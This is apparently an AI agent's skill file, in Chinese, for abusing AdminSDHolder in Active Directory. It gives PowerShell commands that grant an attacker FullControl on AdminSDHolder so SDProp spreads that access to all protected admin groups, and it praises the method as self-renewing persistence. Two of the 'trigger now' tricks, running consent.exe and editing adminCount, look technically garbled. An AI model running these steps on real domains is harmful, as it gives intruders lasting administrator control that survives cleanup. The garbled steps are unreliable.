---
name: 'adminsdholder-abuse'
description: 'AdminSDHolder滥用：添加ACE→SDProp自动传播→所有受保护组持久化。60分钟传播周期+手动触发。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## AdminSDHolder 滥用

### 原理
AdminSDHolder 是 AD 中保护高权限组的特殊对象。SDProp 每 60 分钟将其 ACL 复制到所有受保护组（Domain Admins、Administrators、Enterprise Admins 等）。在 AdminSDHolder 的 ACL 中加一条 ACE → 60 分钟后该 ACE 传播到所有受保护对象 → 持久化。

### 利用
```powershell
# 1. 给 AdminSDHolder 添加 FullControl ACE（需要 DA 或对 AdminSDHolder 有写权）
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Verbose -Rights All

# 2. 等待 SDProp 传播（最多 60 分钟）
# 3. 手动触发 SDProp
Invoke-SDPropagator -showProgress

# 绕过等待的方案：
# → Run SDProp NOW:
Start-Process -FilePath "consent.exe" -ArgumentList "1"
# 或修改 AdminSDHolder 的 adminCount 属性触发立即传播
```

### 检测是否被 SDProp 保护
```powershell
# adminCount=1 表示受保护
Get-ADUser -Filter {adminCount -eq 1}
Get-ADGroup -Filter {adminCount -eq 1}
```

### 清理
```powershell
# 从 AdminSDHolder 移除添加的 ACE
Remove-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker
```

### 为什么比其他持久化更好
- 传播是**自动的**（SDProp 定时器）
- 被保护组**定期重置**受 AdminSDHolder 控制的 ACL（防止手动修改）
- 即使清理了受保护对象上的 ACE，60 分钟后会**重新传播回来**
